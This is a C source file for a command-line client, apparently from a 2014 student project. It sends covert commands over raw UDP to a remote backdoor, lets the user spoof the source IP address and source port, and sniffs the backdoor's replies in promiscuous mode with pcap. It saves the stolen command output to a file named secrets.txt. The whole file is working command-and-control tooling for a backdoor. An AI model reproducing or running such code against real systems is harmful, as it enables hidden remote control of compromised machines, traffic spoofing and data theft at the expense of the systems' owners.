/*--------------------------------------------------------------------------------------------------------------
--	SOURCE FILE:		client.c - A simple UDP client that sends covert messages to a backdoor.
--
--	PROGRAM:		    client
--
--	FUNCTIONS:		    Berkeley Socket API
--
--	LAST MODIFIED:		October 6, 2014
--
--	DESIGNERS:	        Based on examples by Aman Abdulla
--				        Modified and redesigned: Slade Solobay & Zach Smoroden
--
--	PROGRAMMERS:        Slade Solobay & Zach Smoroden
--
--	NOTES:
--	The program will send a covert message to a specific IP address (an IP running the backdoor.py) over a specific
--  destination port. The program also has the ability to spoof the source port and source IP address. Once a command
--  is sent the client will wait for a responce from the backdoor and save the output to secrets.txt.
--
--  OUTPUT: secrets.txt - will be saved in the program root directory.
--
--	USAGE: ./client -d <Destination IP> -p [Destination Port] -h [Source IP] -s [Source Port] -i [Interface]
--
--------------------------------------------------------------------------------------------------------------*/
#include "client.h"

int main (int argc, char **argv)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    struct AddrInfo *Addr_Ptr;
    PcapInfo *pcap_ptr;
    char *interface;
    char temp[BUFLEN];
    int arg, opt;
    bpf_u_int32 maskp;          // subnet mask

    memset(errbuf,0,PCAP_ERRBUF_SIZE);

    if (argc < 3)
    {
        usage(argv);
    }

    if ((Addr_Ptr = malloc (sizeof (struct AddrInfo))) == NULL)
    {
        perror ("malloc");
        exit (1);
    }

    // Set the default values
    Addr_Ptr->SrcHost = DEFAULT_SRC_IP;		 // Default Source IP
    Addr_Ptr->DstHost = NULL;			     // Must be specified by user!
    Addr_Ptr->dport = DEFAULT_DST_PORT;		 // Default Destination Port
    Addr_Ptr->sport = DEFAULT_SRC_PORT;		 // Default Source Port
    Addr_Ptr->cmd = temp;                    // NULL default command
    interface = DEFAULT_INTERFACE;           //Default Interface to sniff packets on

    // Process command line options
    while ((opt = getopt (argc, argv, OPTIONS)) != -1)
    {
    	switch (opt)
    	{
    	    case 'h':
    	        Addr_Ptr->SrcHost = optarg;
    	    break;

    	    case 'd':
    	        Addr_Ptr->DstHost = optarg;		// Destination Host name
    	    break;

    	    case 'p':
    	        Addr_Ptr->dport = atoi (optarg);
    	    break;

    	    case 's':
    	        Addr_Ptr->sport = atoi (optarg);
    	    break;

            case 'i':
                interface = optarg;
            break;

    	    default:
    	      case '?':
    	        usage (argv);
    	    break;
    	}
    }

    if (Addr_Ptr->DstHost == NULL)
    	usage (argv);

    // set up the packet capture structure and thread
    if ((pcap_ptr = malloc (sizeof (PcapInfo))) == NULL)
    {
    	perror ("malloc");
    	exit (1);
    }

    // Use pcap to get the IP address and subnet mask of the device
    pcap_lookupnet (interface, &pcap_ptr->netp, &maskp, errbuf);

    // open device for reading

    // set the device in promiscuous mode
    pcap_ptr->nic_descr = pcap_open_live (interface, BUFSIZ, 1, -1, errbuf);
    if (pcap_ptr->nic_descr == NULL)
    {
        printf("pcap_open_live(): %s\n",errbuf);
        exit(1);
    }

    // Compile the filter expression
    snprintf (pcap_ptr->cmd, sizeof(pcap_ptr->cmd), FILTER, Addr_Ptr->DstHost, Addr_Ptr->dport, Addr_Ptr->sport);

    //Create a raw socket
    Addr_Ptr->RawSocket = socket (PF_INET, SOCK_RAW, IPPROTO_UDP);

    // Set SO_REUSEADDR so that the port can be resused for further invocations of the application
    arg = 1;
    if (setsockopt (Addr_Ptr->RawSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
        perror("setsockopt");

    while(1) {
        printf("\nPlease enter a covert command (or type quit): ");
        scanf("%s", Addr_Ptr->cmd);
        if(strcmp(Addr_Ptr->cmd, "quit") == 0)
            break;
        send_packet(Addr_Ptr);
        receive_packet(pcap_ptr);
    }

    free (Addr_Ptr);
    pcap_close(pcap_ptr->nic_descr );
    free (pcap_ptr);

    return 0;
}